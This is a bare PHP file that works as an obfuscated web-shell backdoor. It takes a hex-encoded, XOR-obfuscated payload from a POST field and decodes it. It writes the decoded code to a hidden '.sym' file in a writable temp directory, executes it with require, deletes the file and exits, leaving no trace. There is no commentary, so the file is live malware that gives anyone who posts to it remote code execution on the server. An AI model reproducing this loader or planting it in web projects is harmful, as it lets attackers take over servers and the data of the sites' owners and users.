<?php

if(isset($_POST["\x6F\x62ject"])){
	$marker = hex2bin($_POST["\x6F\x62ject"]);
	$comp     =   ''   ;     $h = 0; while($h < strlen($marker)){$comp .= chr(ord($marker[$h]) ^ 23);$h++;}
	$ref = array_filter([session_save_path(), "/var/tmp", getenv("TEMP"), getcwd(), "/dev/shm", sys_get_temp_dir(), getenv("TMP"), "/tmp", ini_get("upload_tmp_dir")]);
	foreach ($ref as $key => $ptr) {
    		if (is_dir($ptr) && is_writable($ptr)) {
    $component = implode("/", [$ptr, ".sym"]);
    if (file_put_contents($component, $comp)) {
	require $component;
	unlink($component);
	die();
}
}
}
}